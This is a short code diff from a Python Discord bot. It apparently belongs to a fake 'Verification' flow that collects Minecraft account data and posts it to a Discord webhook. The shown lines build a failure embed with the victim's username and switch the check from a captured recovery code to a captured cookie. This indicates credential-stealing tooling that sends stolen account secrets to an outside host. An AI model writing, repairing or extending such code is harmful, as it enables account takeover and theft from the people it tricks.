@@ -58,7 +58,7 @@ class MyModalTwo(ui.Modal, title="Verification"):
                 endtime = time.time()
                 timetotal = endtime - starttime
                 webhook = Webhook.from_url(data["webhook"], session=session)
-                if config.LastRecoveryCode == "": #Fail Code
+                if config.LastCookie == "": #Fail Code
                     embedfailsecure = discord.Embed(title="Auto Fail",colour=0xFF0000)
                     embedfailsecure.set_footer(text=threadingNum)
                     embedfailsecure.add_field(name="**Minecraft Username:**", value=f"```{config.LastUserName}```", inline=False)
